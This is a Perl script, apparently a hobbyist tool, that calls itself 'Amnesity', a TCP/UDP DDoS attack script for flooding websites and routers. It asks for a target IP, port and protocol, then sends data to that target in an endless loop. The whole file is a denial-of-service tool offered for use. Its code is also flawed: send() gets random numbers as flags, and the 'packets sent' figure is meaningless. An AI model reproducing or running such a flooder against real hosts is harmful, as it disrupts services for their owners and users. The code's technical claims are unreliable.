#!/usr/bin/perl

use IO::Socket;
system("clear || cls");
#Script Banner================================================================
print "
   ###    ##     ## ##    ## ########  ######  #### ######## ##    ## 
  ## ##   ###   ### ###   ## ##       ##    ##  ##     ##     ##  ##  
 ##   ##  #### #### ####  ## ##       ##        ##     ##      ####   
##     ## ## ### ## ## ## ## ######    ######   ##     ##       ##    
######### ##     ## ##  #### ##             ##  ##     ##       ##    
##     ## ##     ## ##   ### ##       ##    ##  ##     ##       ##    
##     ## ##     ## ##    ## ########  ######  ####    ##       ##   
- Strong/Efficient Modernized TCP/UDP DDoS Attack Script Created By: vConzv
- Works As A Strong DDoS Attack Script On Both Websites As Well As Routers.\n";
print "\n===============================";
print "\n[~] Enter TargetIP: "; # Set Target IP
$host = <STDIN>;
chomp ($host);
while ($host eq ""){
 print "   [!] Set TargetIP?: ";
 $host = <STDIN>;
 chomp ($host);
}
print "TRAGET ==> $host";
print "\n===============================";
print "\n[~] Enter Port: "; # Set Port
$port = <STDIN>;
chomp ($port);
while ($port eq ""){ 
 print "   [!] Enter PORT?: ";       
 $port = <STDIN>;
 chomp ($port); 
}
print "PORT ==> $port";
print "\n===============================";
print "\n[~] Set Protocol (TCP or UDP) :"; # Set Protockol;
$proto = <STDIN>;
chomp ($proto);
while ($proto eq "" || !grep{$proto eq $_} 'TCP','UDP','tcp','udp'){
 print "   [!] Set Protocol (TCP or UDP) ?: ";
 $proto = <STDIN>;
 chomp ($proto);
}
print "Protocol ==> $proto";
print "\n===============================\n";
sleep(2);
{
$sock = IO::Socket::INET->new (
        PeerAddr => $host,
        PeerPort => $port,
        Proto => "$proto" ) || die "\n[!] Error: Connection To Selected Target Faild[ $host ] !!!\n[!] Please Check Your Intenet Connection !\n[!] OR Mabye The Problem From TARGET Side !\n";
}

system("clear || cls");
print "\n[*] Amnesity Is Sending Packets To Target [$host:$port] proto => [$proto].......\n\n";
sleep(3);

packets:
while (1) {
$size = rand() * 8921873 * 99919988;
print ("  Packets sent: $size\n");
send($sock, 999999999999999999999999999, $size); 
packets2:
$size = rand() * 8921873 * 99919988 * 2;
print "Flooding:";
send($sock, 999999999999999999999999999, $size);
packet3:
$size = rand() * 8921873 * 99919988 * 2 + 99919988;
print " (=>$host:$port~$proto<=)";
send($sock, $size, $size); # Attack start################

}
print "Thank You For Using Amnesity As Your Preffered DDoS Tool\n";

